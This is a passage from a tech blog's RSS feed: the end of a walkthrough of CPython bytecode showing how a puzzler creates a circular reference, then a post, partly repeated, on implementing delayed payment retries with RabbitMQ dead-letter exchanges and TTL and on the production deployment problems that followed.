&lt;p&gt;First off, it tells the interpreter to make a map object and put it on the value stack. After this instruction, our value stack looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+----+
| {} |
+----+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;3 LOAD_CONST               0 (5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This loads a constant (&lt;code&gt;5&lt;/code&gt;) on the stack.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+----+
| {} |
+----+
| 5  |
+----+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;6 BUILD_TUPLE              2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This instruction builds a &lt;code&gt;PyTuple&lt;/code&gt; object of size &lt;code&gt;2&lt;/code&gt;, which is in the argument of the opcode. It consumes the top &lt;code&gt;2&lt;/code&gt; things on the stack and make a 2-tuple using these values and put the result tuple on the value stack:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+---------+
| ({}, 5) |
+---------+
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;9 DUP_TOP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we have the &lt;code&gt;DUP_TOP&lt;/code&gt; instruction. It probably stands for &amp;ldquo;duplicate the top of the stack&amp;rdquo;, and reading the corresponding code in the eval loop, this seems to be what it&amp;rsquo;s doing: it gets the object from the top of the stack without popping it off and push the value on the stack, while incrementing the refcount of the object.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s worth noting that this only duplicates the tuple object. The elements inside the tuple are of type &lt;code&gt;*PyObject&lt;/code&gt;, which are pointers to the corresponding values (the dict and the integer), and are not duplicated by this instruction. Here&amp;rsquo;s the value stack after this instruction:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+---------+
| ({}, 5) |
+---------+
| ({}, 5) |
+---------+
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;10 UNPACK_SEQUENCE          2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next instruction is &lt;code&gt;UNPACK_SEQUENCE&lt;/code&gt; with argument &lt;code&gt;2&lt;/code&gt;. This will first pop the stack, so &lt;code&gt;({}, 5)&lt;/code&gt; is off the stack, and then push each element from the tuple on the stack in reverse order. After this instruction, the stack will be:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+---------+
| ({}, 5) |
+---------+
|   5     |
+---------+
|   {}    |
+---------+
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;13 STORE_NAME               0 (a)
16 STORE_NAME               1 (b)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next two instructions deal with &amp;ldquo;names&amp;rdquo;, which are variables for the scope of the frame. &lt;code&gt;STORE_NAME a&lt;/code&gt; will pop the stack, and point &lt;code&gt;a&lt;/code&gt; to the value, and similarily for &lt;code&gt;STORE_NAME b&lt;/code&gt;. After this instruction, there will be two bindings in the frame: &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; and the stack will be back to having only one element, the tuple:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;stack:
+---------+
| ({}, 5) |
+---------+

bindings:
a &amp;lt;- {}
b &amp;lt;- 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next two instructions:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;19 LOAD_NAME                0 (a)
22 LOAD_CONST               0 (5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;LOAD_NAME a&lt;/code&gt; will push the value that the variable is bound to on the stack, so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;stack:
+---------+
| ({}, 5) |
+---------+
|    {}   |
+---------+

bindings:
a &amp;lt;- {}
b &amp;lt;- 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and &lt;code&gt;LOAD_CONST 5&lt;/code&gt;, as we&amp;rsquo;ve seen before, simply pushes the constant &lt;code&gt;5&lt;/code&gt; on the stack:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;stack:
+---------+
| ({}, 5) |
+---------+
|    {}   |
+---------+
|     5   |
+---------+

bindings:
a &amp;lt;- {}
b &amp;lt;- 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;25 STORE_SUBSCR
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is where the magic happens. &lt;code&gt;STORE_SUBSCR&lt;/code&gt; is an instruction to set element on the dictionary given the index. Here&amp;rsquo;s the code that handles this opcode in the eval loop:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;TARGET_NOARG(STORE_SUBSCR)
{
    w = TOP();
    v = SECOND();
    u = THIRD();
    STACKADJ(-3);
    /* v[w] = u */
    err = PyObject_SetItem(v, w, u);
    Py_DECREF(u);
    Py_DECREF(v);
    Py_DECREF(w);
    if (err == 0) DISPATCH();
    break;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, &lt;code&gt;TOP&lt;/code&gt;, &lt;code&gt;SECOND&lt;/code&gt;, &lt;code&gt;THIRD&lt;/code&gt; are macros that take values off of the value stack. Given our state of the virtual machine:
* &lt;code&gt;w = TOP()&lt;/code&gt; =&amp;gt; &lt;code&gt;w = 5&lt;/code&gt;
* &lt;code&gt;v = SECOND()&lt;/code&gt; =&amp;gt; &lt;code&gt;v = {}&lt;/code&gt;
* &lt;code&gt;w = THIRD()&lt;/code&gt; =&amp;gt; &lt;code&gt;w = ({}, 5)&lt;/code&gt;, but keep in mind, the first element in &lt;code&gt;w&lt;/code&gt; (the tuple) is actually the same object &lt;code&gt;v&lt;/code&gt; is pointing to.&lt;/p&gt;

&lt;p&gt;Thus, calling &lt;code&gt;PyObject_SetItem(v, w, u)&lt;/code&gt; sets &lt;code&gt;v[w] = u&lt;/code&gt; =&amp;gt; &lt;code&gt;v[5] = (v, 5)&lt;/code&gt;, and there a circular reference is born!&lt;/p&gt;

&lt;p&gt;From the sequence of operation, we can tell the order by which the assignments were executed:
1. &lt;code&gt;a, b = {}, 5&lt;/code&gt;
2. &lt;code&gt;a[5] = ({}, 5)&lt;/code&gt;, with &lt;code&gt;a&lt;/code&gt; refering to the dictionary&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Diving into the Python implementation is the next level ninjary that may come in handy in some cases. Granted, no one is going to write production code like the one in the puzzler, but stepping through and visualizing the virtual machine is a pretty useful and fun experience that makes me appreciate more the language I use everyday.&lt;/p&gt;

&lt;p&gt;Again, thanks to Philip Guo for the videos and Michael Kennedy for the podcast. Also, checkout Professor Guo&amp;rsquo;s &lt;a href=&#34;http://www.pythontutor.com/&#34;&gt;python tutor&lt;/a&gt; for visualizing how code is run.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Use rabbitmq DLX to implement delayed retry</title>
      <link>http://blog.idempotent.ca/2015/04/30/use-rabbitmq-dlx-to-implement-delayed-retry/</link>
      <pubDate>Thu, 30 Apr 2015 00:37:42 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/2015/04/30/use-rabbitmq-dlx-to-implement-delayed-retry/</guid>
      <description>

&lt;p&gt;In this post, I&amp;rsquo;m going to describe the experience at &lt;code&gt;$DAYJOB&lt;/code&gt; regarding implementing delayed retry using &lt;a href=&#34;https://www.rabbitmq.com/&#34;&gt;rabbitmq&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://www.rabbitmq.com/dlx.html&#34;&gt;DLX&lt;/a&gt; combined with a TTL. The technique has been described at a few &lt;a href=&#34;http://yuserinterface.com/dev/2013/01/08/how-to-schedule-delay-messages-with-rabbitmq-using-a-dead-letter-exchange/&#34;&gt;places&lt;/a&gt; but it is new to me personally and our company. I&amp;rsquo;d like to capture the experience we had both in implementing and in deploying to production.&lt;/p&gt;

&lt;h1 id=&#34;the-problem&#34;&gt;The problem&lt;/h1&gt;

&lt;p&gt;At &lt;code&gt;$DAYJOB&lt;/code&gt; we have a service that integrates with a 3rd-party API that processes credit card payments and when successful, records a payment object on our customer&amp;rsquo;s invoices, and change the invoice status. Pretty straight-forward stuff. However, lately we&amp;rsquo;ve been experiencing an elevated amount of random failures from our service provider.&lt;/p&gt;

&lt;p&gt;Calls to our provider to create a checkout using the client&amp;rsquo;s credit card information would time out randomly, or return an &amp;ldquo;unknown error&amp;rdquo;. When it happens, we don&amp;rsquo;t record a payment object on the invoice since we don&amp;rsquo;t know the actual status of the checkout, nor do we have the &lt;code&gt;reference_id&lt;/code&gt; for the checkout. However, as we discovered, some of these timed-out calls did go through and the clients&amp;rsquo; credit cards charged.&lt;/p&gt;

&lt;p&gt;We checked with our service provider and were told that they have been experiencing increased volumes and their infrastructure currently can&amp;rsquo;t keep up. However, they suggest that we use an undocumented feature which allows a &lt;code&gt;unique_id&lt;/code&gt; to be passed in along with the checkout call. The &lt;code&gt;unique_id&lt;/code&gt; serves as an idempotent key (similar to &lt;a href=&#34;https://stripe.com/docs/api?lang=curl#idempotent_requests&#34;&gt;Stripe&amp;rsquo;s&lt;/a&gt;). Multiple calls with the same &lt;code&gt;unique_id&lt;/code&gt; won&amp;rsquo;t create multiple checkout objects on their end and thus ensuring the checkout is made but won&amp;rsquo;t double/triple charge the customer&amp;rsquo;s car.&lt;/p&gt;

&lt;h1 id=&#34;architecting-the-solution&#34;&gt;Architecting the solution&lt;/h1&gt;

&lt;p&gt;Armed with this new secret API feature, our team goes back to the drawing board. At work, we use &lt;a href=&#34;https://www.rabbitmq.com/&#34;&gt;rabbitmq&lt;/a&gt; extensively for asynchronous processing. If some operation doesn&amp;rsquo;t have to be carried out synchronously with a web request, we throw a message on the queue and have a queue consumer process that message and update states. We use a library called &lt;a href=&#34;https://github.com/ojacobson/sparkplug&#34;&gt;sparkplug&lt;/a&gt; that makes writing queue consumer super-easy. So, everything seems to fall in friendly terrotiries: we make a checkout call with a random id and when we encounter timeout or unknown error, instead of returning an error response to the user, we return &lt;code&gt;202 Accepted&lt;/code&gt; to our user and throw a message on the queue, so a consumer can grab it and retry the checkout with the same original &lt;code&gt;unique_id&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&#34;the-missing-piece&#34;&gt;The missing piece&lt;/h1&gt;

&lt;p&gt;However, we quickly realized it&amp;rsquo;s not that simple. What if the retry encountered the same error? We can put it back on the queue, but when does it get processed by the consumer again? We want to add a time delay to the subsequent retries, and the orginal retry as well.&lt;/p&gt;

&lt;h1 id=&#34;dead-letter-exchange-https-www-rabbitmq-com-dlx-html-and-ttl-https-www-rabbitmq-com-ttl-html&#34;&gt;&lt;a href=&#34;https://www.rabbitmq.com/dlx.html&#34;&gt;Dead-Letter-Exchange&lt;/a&gt; and &lt;a href=&#34;https://www.rabbitmq.com/ttl.html&#34;&gt;TTL&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;After some research on the internet, seems like this problem has been &lt;a href=&#34;https://www.cloudamqp.com/docs/delayed-messages.html&#34;&gt;solved&lt;/a&gt; &lt;a href=&#34;http://yuserinterface.com/dev/2013/01/08/how-to-schedule-delay-messages-with-rabbitmq-using-a-dead-letter-exchange/&#34;&gt;before&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The idea here is that you have two queues: &lt;code&gt;Qa&lt;/code&gt; and &lt;code&gt;Qb&lt;/code&gt;.  When a checkout request times out, we put a message on a &lt;code&gt;Qa&lt;/code&gt;.  &lt;code&gt;Qa&lt;/code&gt; is declared with &lt;code&gt;x-dead-letter-exchange&lt;/code&gt;, &lt;code&gt;x-dead-letter-routing-key&lt;/code&gt; and &lt;code&gt;x-message-ttl&lt;/code&gt; (in milliseconds).  When the message is in &lt;code&gt;Qa&lt;/code&gt; for &lt;code&gt;ttl&lt;/code&gt; milliseconds, the message will be re-routed to the specified dead-letter-exchange with the routing key.  We can bind &lt;code&gt;Qb&lt;/code&gt; to the exchange with the routing key, and attach a consumer to only &lt;code&gt;Qb&lt;/code&gt; and retry the checkout call.&lt;/p&gt;

&lt;p&gt;If the retry call fails for the same reason (timeout or unknown error), we re-publish the message to &lt;code&gt;Qa&lt;/code&gt; again and acknowledges the message so it&amp;rsquo;s no longer in &lt;code&gt;Qb&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/dlx_1.png&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Flow diagram&lt;/h4&gt;
        
    &lt;/figcaption&gt;
    
&lt;/figure&gt;


&lt;p&gt;The whole flow looks like this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/dlx_2.png&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Flow diagram&lt;/h4&gt;
        
    &lt;/figcaption&gt;
    
&lt;/figure&gt;


&lt;h1 id=&#34;implementation-testing-strategy-and-deployment-saga&#34;&gt;Implementation, Testing Strategy and Deployment saga&lt;/h1&gt;

&lt;h2 id=&#34;implementation&#34;&gt;Implementation&lt;/h2&gt;

&lt;p&gt;Implementation is probably the most straight-forward phase of the project once we have the design on paper.  The only obstacle is that the library we use for writing rabbitmq consumers (sparkplug) does not support declaring queues with extra parameters, and the DLX related parameters: &lt;code&gt;x-dead-letter-exchange&lt;/code&gt; &lt;code&gt;x-dead-letter-routing-key&lt;/code&gt;, and &lt;code&gt;x-message-ttl&lt;/code&gt; are all &amp;ldquo;extra parameters&amp;rdquo; according to &lt;code&gt;amqplib&lt;/code&gt;, which is used by sparkplug. To solve this, I sent this &lt;a href=&#34;https://github.com/ojacobson/sparkplug/pull/10/files&#34;&gt;PR&lt;/a&gt; to sparkplug, so it recognizes extra parameters and pass them down to amqp library.&lt;/p&gt;

&lt;p&gt;Another road block appeared when we ran the system on our dev images for the first time. The underlying amqplib would error out on startup. Upon closer investigation, it appeared the error happened while talking to rabbitmq and the amqplib can&amp;rsquo;t handle certain rabbitmq frames. So I went searching for the amqp project, only to find out that it was deprecated &lt;a href=&#34;https://pypi.python.org/pypi/amqplib&#34;&gt;long ago&lt;/a&gt;. Fortunately, there&amp;rsquo;s a fork of the library &lt;a href=&#34;https://pypi.python.org/pypi/amqp&#34;&gt;amqp&lt;/a&gt; that&amp;rsquo;s maintained by the reputable &lt;a href=&#34;http://www.celeryproject.org/&#34;&gt;Celery project&lt;/a&gt;. It&amp;rsquo;s has API compatibility with amqplib and appeared to be a drop-in replacement. We dropped it in and everything seems to work. Reading the online literature, it seems to be the case that the old library does not handle the &lt;code&gt;TTL&lt;/code&gt; amqp extension.&lt;/p&gt;

&lt;h2 id=&#34;testing-strategy&#34;&gt;Testing Strategy&lt;/h2&gt;

&lt;p&gt;So, since the 3rd party API timeout is an edge case, they did not provide a way trigger this behaviour the same way we can trigger, say, a declined transaction. We could fake the URL for the 3rd party service in DNS or &lt;code&gt;/etc/hosts&lt;/code&gt; or we can change the SDK to change the base url for their API to somewhere else and cause a timeout that way, but neither is ideal. The biggest disadvantage is that we have no way of getting a request out of the retry state.&lt;/p&gt;

&lt;p&gt;Eventually, we decided to &lt;a href=&#34;http://en.wikipedia.org/wiki/Man-in-the-middle_attack&#34;&gt;MITM&lt;/a&gt; ourselves :) We can write a simple proxy server, and for the most part, it&amp;rsquo;s going to be a pass-through, but on certain requests, we intercept it and return an unknown error (500 series with specific response body).  To trigger it, we set the checkout amount to &lt;code&gt;$666&lt;/code&gt;, and in the proxy, we keep an internal counter based on the checkout&amp;rsquo;s unique id, and increment the counter every time it&amp;rsquo;s retried, and then we can set a max retry threshold in the proxy so the proxy becomes a pass through again if the max retry threshold is reached.&lt;/p&gt;

&lt;p&gt;We used this small nifty library &lt;a href=&#34;https://github.com/allfro/pymiproxy&#34;&gt;pymiproxy&lt;/a&gt; as a base for our proxy server. It turns out the proxy is pretty straight-forward as well, and a big shout-out to the author of pymiproxy.&lt;/p&gt;

&lt;h2 id=&#34;deployment&#34;&gt;Deployment&lt;/h2&gt;

&lt;p&gt;Everything until now is like a cake walk. Sure, there are some problems with the underlying libraries but that requires patching but they were quite easy to identify and fix. Deployment, on the other hand, has been like riding on the &lt;a href=&#34;https://www.youtube.com/watch?v=Mgsbau5qkTE&#34;&gt;Behemoth in Canada&amp;rsquo;s Wonderland&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;First of all, while getting the code onto the testing environment, we encountered the first gremlin. The staging is running on the exact same version of rabbitmq and the exact same configuration. However, on staging, when a message is published on the DLQ (&lt;code&gt;Qa&lt;/code&gt;) in our example, after &lt;code&gt;TTL&lt;/code&gt;, the message would simply disappear and did not get routed to &lt;code&gt;Qb&lt;/code&gt;. What&amp;rsquo;s worse, sometimes even &lt;code&gt;Qa&lt;/code&gt; is completely gone after the message is dropped on the floor! This is terribly frustrating. The queue is declared as durable, and so is the exchange. I even did a side-by-side comparison of the sparkplug log output to see if anything is different. Well, there was! The declaration sequence is different between staging and dev. On dev, the dead-letter exchange is declared before &lt;code&gt;Qa&lt;/code&gt; which specifies &lt;code&gt;x-dead-letter-exchange&lt;/code&gt;. That makes sense! Reading the &lt;a href=&#34;https://github.com/ojacobson/sparkplug/blob/master/sparkplug/config/__init__.py#L57-L77&#34;&gt;sparkplug code&lt;/a&gt;, it calculates the dependencies between queues, exchanges, bindings and consumers to determine the order of which they should be declared. However, our modification that enabled sparkplug to pass down DLX, but sparkplug has no idea that the queue depends on the DLX! Based on this observation, I cooked up another &lt;a href=&#34;https://github.com/freshbooks/sparkplug/pull/2/files&#34;&gt;PR&lt;/a&gt; such that if DLX is specified, make sure we make the DLX a dependency of the queue so the exchange gets declared before it. Did a few tests locally, and hey, it appears to be working!&lt;/p&gt;

&lt;p&gt;Just as I thought my shrewed observation has solved this major mystery, the second day, people reported that the queue started go AWOL again! Grumbled, I sat down and read carefully the documentation on &lt;a href=&#34;https://www.rabbitmq.com/dlx.html&#34;&gt;dead-letter exchange&lt;/a&gt; and discovered this:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note that the exchange does not have to be declared when the queue is declared, but it should exist by the time messages need to be dead-lettered; if it is missing then, the messages will be silently dropped.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This invalidates my previous hypothesis that the out-of order declaration was the root cause of the problem. There we go, I was back to square one.&lt;/p&gt;

&lt;p&gt;At this time, I wanted to try a different approach. Instead of forming hypothesis from observation, I searched for evidence. I went on the server, and start to look at the logs to search for any traces that can be salvaged. The rabbitmq log is very noisy with all the connection messages. Once in a while you get something remotely interesting, but they were not relevant. Then I manually published a message on the queue, and waited for the message and queue to disappear. Lo and behold, there&amp;rsquo;s something in the logs!&lt;/p&gt;

&lt;script src=&#34;//gist.github.com/kevinjqiu/e626bcc40eb803214968.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;There&amp;rsquo;s our smoking gun! Further gooling revealed &lt;a href=&#34;http://lists.rabbitmq.com/pipermail/rabbitmq-discuss/2012-April/019368.html&#34;&gt;this&lt;/a&gt;. That&amp;rsquo;s EXACTLY our issue! And the version of rabbitmq we&amp;rsquo;re using is EXACTLY 2.8.1! What a relief! We just need to upgrade to 2.8.2 and everything would be fine.&lt;/p&gt;

&lt;p&gt;So there I was, preparing an internal repository to host the rpm (since we&amp;rsquo;re on a hopelessly old version of CentOS), and prepared puppet changes for the new version. Deployed on all the environments and sent it off to QA. QA ok&amp;rsquo;ed it just before the weekend and life is good again.&lt;/p&gt;

&lt;p&gt;Except, not at all! There are a few more surprises waiting for us before the end of tunnel. First of all, our partner whose payment API we&amp;rsquo;re integrating has received an imminent DDOS threat, and fearing not having a retry mechanism would caused a huge burden for us and our support crew, we need to get this out to production ASAP. After pulling some levers and convincing our ops team that this is a relatively low risk point release upgrade (from rabbitmq 2.8.1 to 2.8.2), we got the green light and ops are on their way upgrading rabbitmq. Everything seemed to be going alone well, until, when we switched all components to point to the hosts that&amp;rsquo;s on the new rabbitmq, our app stopped working! Phone calls flooded in, alerts set off everywhere and on top of that, even the streets in front of our building had a couple of emergency vehicles passing by! Goodness, what have we done! Ops quickly rolled it back, and we were left dumbfounded by this yet another surprise.&lt;/p&gt;

&lt;p&gt;Analyzing the logs from various components during the downtime, it appeared the components talking to rabbitmq have timed out trying to publish messages. We checked that the hosts can indeed reach each other, all the names can be resolved and firewall rules are not in effect. So, we hit a wall again.&lt;/p&gt;

&lt;p&gt;On the second day, we regrouped, and experimented on the backup data centre. We upgraded, and tried to put a message on the queue, and guess what, it blocked! It&amp;rsquo;s great that we reproduced the issue. Since the staging environment worked just fine, I captured &lt;code&gt;strace&lt;/code&gt; on the staging environment, and ops did the same on prod, and compared the output. It&amp;rsquo;s pretty clear that the process was waiting on reading socket (syscall was &lt;code&gt;recvfrom(...)&lt;/code&gt;) and it blocked. Then I did &lt;code&gt;tcpdump&lt;/code&gt; and compared that with the output on prod, and also proven to be futile.&lt;/p&gt;

&lt;p&gt;In that afternoon, our fortune suddenly took a positive turn, when one of the ops discovered this in the logs while starting the new rabbitmq:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;=INFO REPORT==== 29-Apr-2015::14:51:09 ===
Disk free space limit now exceeded. Free bytes:19033128960 Limit:50634379264
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, this version of rabbitmq started to check free disk space, and &lt;strong&gt;blocks&lt;/strong&gt; incoming message if the disk space is deemed inadequate! Wow, this is so unexpected that we all laughed when we discovered this to be the root cause. However, for me, I need to be convinced that why it wasn&amp;rsquo;t an issue for staging environment.&lt;/p&gt;

&lt;p&gt;So I cloned rabbitmq git repository, and looked for anything that&amp;rsquo;s related to &lt;code&gt;disk_free_limit&lt;/code&gt;. Finally, I found this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-erlang&#34;&gt;{disk_free_limit, {mem_relative, 1.0}},
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;from &lt;a href=&#34;https://github.com/rabbitmq/rabbitmq-server/blob/rabbitmq_v2_8_2/ebin/rabbit_app.in#L22&#34;&gt;here&lt;/a&gt;. Since we&amp;rsquo;re using the default config, this is in effect, and it essentially says &amp;ldquo;stop accepting message if the disk space is not at least as big as the RAM&amp;rdquo;, and it just so happens on prod, we have 50G of RAM and therefore, require at least 50G of free space for rabbitmq to start accepting messages!&lt;/p&gt;

&lt;p&gt;Reading the rabbitmq 2.8.2 release notes, and they &lt;strong&gt;did&lt;/strong&gt; &lt;a href=&#34;https://www.rabbitmq.com/release-notes/README-2.8.2.txt&#34;&gt;mention&lt;/a&gt; this &amp;ldquo;feature&amp;rdquo;, but failed to mention that it could block your connection &lt;strong&gt;forever&lt;/strong&gt; and bring your site down&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;There you go.  That&amp;rsquo;s our adventure implementing and deploying delayed retry using rabbitmq&amp;rsquo;s DLX and TTL. It&amp;rsquo;s frustrating and rewarding at the same time, and there&amp;rsquo;s definitely something we can all take home with:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Software is hard, even for experienced developers and ops&lt;/li&gt;
&lt;li&gt;Gather all the evidences before forming hypothesis on the root cause&lt;/li&gt;
&lt;li&gt;Certainly, read the docs thoroughly before hypothesizing&lt;/li&gt;
&lt;li&gt;Expect problems when switching environments&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I haven&amp;rsquo;t been blogging for a while, partly because life catches up, and partly because I&amp;rsquo;ve been less than disciplined but I spent some time writing down this experience worth remembering :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Use rabbitmq DLX to implement delayed retry</title>
      <link>http://blog.idempotent.ca/starred/2015-04-30-use-rabbitmq-dlx-to-implement-delayed-retry/</link>
      <pubDate>Thu, 30 Apr 2015 00:37:42 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/starred/2015-04-30-use-rabbitmq-dlx-to-implement-delayed-retry/</guid>
      <description>

&lt;p&gt;In this post, I&amp;rsquo;m going to describe the experience at &lt;code&gt;$DAYJOB&lt;/code&gt; regarding implementing delayed retry using &lt;a href=&#34;https://www.rabbitmq.com/&#34;&gt;rabbitmq&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://www.rabbitmq.com/dlx.html&#34;&gt;DLX&lt;/a&gt; combined with a TTL. The technique has been described at a few &lt;a href=&#34;http://yuserinterface.com/dev/2013/01/08/how-to-schedule-delay-messages-with-rabbitmq-using-a-dead-letter-exchange/&#34;&gt;places&lt;/a&gt; but it is new to me personally and our company. I&amp;rsquo;d like to capture the experience we had both in implementing and in deploying to production.&lt;/p&gt;

&lt;h1 id=&#34;the-problem&#34;&gt;The problem&lt;/h1&gt;

&lt;p&gt;At &lt;code&gt;$DAYJOB&lt;/code&gt; we have a service that integrates with a 3rd-party API that processes credit card payments and when successful, records a payment object on our customer&amp;rsquo;s invoices, and change the invoice status. Pretty straight-forward stuff. However, lately we&amp;rsquo;ve been experiencing an elevated amount of random failures from our service provider.&lt;/p&gt;

&lt;p&gt;Calls to our provider to create a checkout using the client&amp;rsquo;s credit card information would time out randomly, or return an &amp;ldquo;unknown error&amp;rdquo;. When it happens, we don&amp;rsquo;t record a payment object on the invoice since we don&amp;rsquo;t know the actual status of the checkout, nor do we have the &lt;code&gt;reference_id&lt;/code&gt; for the checkout. However, as we discovered, some of these timed-out calls did go through and the clients&amp;rsquo; credit cards charged.&lt;/p&gt;

&lt;p&gt;We checked with our service provider and were told that they have been experiencing increased volumes and their infrastructure currently can&amp;rsquo;t keep up. However, they suggest that we use an undocumented feature which allows a &lt;code&gt;unique_id&lt;/code&gt; to be passed in along with the checkout call. The &lt;code&gt;unique_id&lt;/code&gt; serves as an idempotent key (similar to &lt;a href=&#34;https://stripe.com/docs/api?lang=curl#idempotent_requests&#34;&gt;Stripe&amp;rsquo;s&lt;/a&gt;). Multiple calls with the same &lt;code&gt;unique_id&lt;/code&gt; won&amp;rsquo;t create multiple checkout objects on their end and thus ensuring the checkout is made but won&amp;rsquo;t double/triple charge the customer&amp;rsquo;s car.&lt;/p&gt;

&lt;h1 id=&#34;architecting-the-solution&#34;&gt;Architecting the solution&lt;/h1&gt;

&lt;p&gt;Armed with this new secret API feature, our team goes back to the drawing board. At work, we use &lt;a href=&#34;https://www.rabbitmq.com/&#34;&gt;rabbitmq&lt;/a&gt; extensively for asynchronous processing. If some operation doesn&amp;rsquo;t have to be carried out synchronously with a web request, we throw a message on the queue and have a queue consumer process that message and update states. We use a library called &lt;a href=&#34;https://github.com/ojacobson/sparkplug&#34;&gt;sparkplug&lt;/a&gt; that makes writing queue consumer super-easy. So, everything seems to fall in friendly terrotiries: we make a checkout call with a random id and when we encounter timeout or unknown error, instead of returning an error response to the user, we return &lt;code&gt;202 Accepted&lt;/code&gt; to our user and throw a message on the queue, so a consumer can grab it and retry the checkout with the same original &lt;code&gt;unique_id&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&#34;the-missing-piece&#34;&gt;The missing piece&lt;/h1&gt;

&lt;p&gt;However, we quickly realized it&amp;rsquo;s not that simple. What if the retry encountered the same error? We can put it back on the queue, but when does it get processed by the consumer again? We want to add a time delay to the subsequent retries, and the orginal retry as well.&lt;/p&gt;

&lt;h1 id=&#34;dead-letter-exchange-https-www-rabbitmq-com-dlx-html-and-ttl-https-www-rabbitmq-com-ttl-html&#34;&gt;&lt;a href=&#34;https://www.rabbitmq.com/dlx.html&#34;&gt;Dead-Letter-Exchange&lt;/a&gt; and &lt;a href=&#34;https://www.rabbitmq.com/ttl.html&#34;&gt;TTL&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;After some research on the internet, seems like this problem has been &lt;a href=&#34;https://www.cloudamqp.com/docs/delayed-messages.html&#34;&gt;solved&lt;/a&gt; &lt;a href=&#34;http://yuserinterface.com/dev/2013/01/08/how-to-schedule-delay-messages-with-rabbitmq-using-a-dead-letter-exchange/&#34;&gt;before&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The idea here is that you have two queues: &lt;code&gt;Qa&lt;/code&gt; and &lt;code&gt;Qb&lt;/code&gt;.  When a checkout request times out, we put a message on a &lt;code&gt;Qa&lt;/code&gt;.  &lt;code&gt;Qa&lt;/code&gt; is declared with &lt;code&gt;x-dead-letter-exchange&lt;/code&gt;, &lt;code&gt;x-dead-letter-routing-key&lt;/code&gt; and &lt;code&gt;x-message-ttl&lt;/code&gt; (in milliseconds).  When the message is in &lt;code&gt;Qa&lt;/code&gt; for &lt;code&gt;ttl&lt;/code&gt; milliseconds, the message will be re-routed to the specified dead-letter-exchange with the routing key.  We can bind &lt;code&gt;Qb&lt;/code&gt; to the exchange with the routing key, and attach a consumer to only &lt;code&gt;Qb&lt;/code&gt; and retry the checkout call.&lt;/p&gt;

&lt;p&gt;If the retry call fails for the same reason (timeout or unknown error), we re-publish the message to &lt;code&gt;Qa&lt;/code&gt; again and acknowledges the message so it&amp;rsquo;s no longer in &lt;code&gt;Qb&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/dlx_1.png&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Flow diagram&lt;/h4&gt;
        
    &lt;/figcaption&gt;
    
&lt;/figure&gt;


&lt;p&gt;The whole flow looks like this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/dlx_2.png&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Flow diagram&lt;/h4&gt;
        
